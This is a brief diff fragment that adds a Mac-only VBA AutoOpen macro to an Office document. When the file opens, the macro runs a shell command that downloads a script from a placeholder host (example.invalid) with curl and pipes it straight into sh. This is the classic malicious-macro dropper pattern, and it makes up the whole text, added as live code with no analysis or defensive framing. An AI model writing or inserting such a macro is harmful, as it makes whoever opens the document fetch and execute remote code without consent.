@@ -1,0 +1,6 @@
+#If Mac Then
+Sub AutoOpen()
+MacScript("do shell script ""curl -s http://example.invalid/a | sh""")
+End Sub
+#End If
+
